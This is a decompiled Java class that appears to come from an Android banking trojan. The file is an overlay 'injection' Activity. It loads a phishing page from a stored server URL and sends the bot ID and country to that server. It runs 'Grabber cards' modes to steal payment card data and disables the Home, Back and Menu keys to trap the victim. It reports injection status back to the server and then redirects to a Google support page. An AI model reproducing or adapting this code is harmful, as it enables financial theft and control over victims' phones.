package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: loaded from: classes.dex */
public class pltrfi extends Activity {

    /* JADX INFO: renamed from: a */
    C0022c f469a = new C0022c();

    /* JADX INFO: renamed from: b */
    C0020b f470b = new C0020b();

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.pltrfi$a */
    private class C0042a extends WebChromeClient {
        private C0042a() {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.pltrfi$b */
    private class C0043b extends WebViewClient {
        private C0043b() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
            pltrfi.this.f470b.m230a("Start Activity Inject", str);
            if (str.contains("a10.php") && !str.contains("STOP")) {
                pltrfi.this.f470b.m250d(pltrfi.this, "save_inj", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "lock_inj", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "timeStartGrabber", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "name", "false");
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
            }
            if (str.contains("STOP")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                pltrfi.this.finish();
            }
            if (str.contains("exitdagjhadfjedgjsfhexitlgdgsfhafg")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                pltrfi.this.finish();
            }
            if (str.contains("|Grabber card step 3|")) {
                pltrfi.this.f470b.m250d(pltrfi.this, "save_inj", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "lock_inj", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "timeStartGrabber", "");
                pltrfi.this.f470b.m250d(pltrfi.this, "name", "false");
            }
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override // android.app.Activity
    @SuppressLint({"SetJavaScriptEnabled"})
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        this.f470b.m250d(this, "name", "false");
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        this.f470b.m250d(this, "name", "true");
        String stringExtra = getIntent().getStringExtra("str");
        if (stringExtra.equals("") && stringExtra.equals(null)) {
            return;
        }
        this.f469a.getClass();
        String strM251e = "";
        try {
            strM251e = this.f470b.m251e(this, "urlInj");
        } catch (Exception unused) {
        }
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new C0043b());
        webView.setWebChromeClient(new C0042a());
        webView.loadUrl(strM251e + "/fafa.php?f=" + stringExtra + "&p=" + this.f470b.m264q(this) + "|" + Resources.getSystem().getConfiguration().locale.getCountry().toLowerCase());
        setContentView(webView);
        if (stringExtra.equals("grab3")) {
            stringExtra = "Info + Grabber cards mini";
        }
        if (stringExtra.equals("grab1")) {
            stringExtra = "Info + Grabber cards";
        }
        if (stringExtra.equals("grab4")) {
            stringExtra = "Grabber cards mini";
        }
        if (stringExtra.equals("grab2")) {
            stringExtra = "Grabber cards";
        }
        C0020b c0020b = this.f470b;
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(this.f470b.m242c(this.f470b.m264q(this) + "|Start injection " + stringExtra + "|"));
        c0020b.m235b(this, "4", sb.toString());
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        this.f470b.m250d(this, "name", "false");
    }
}
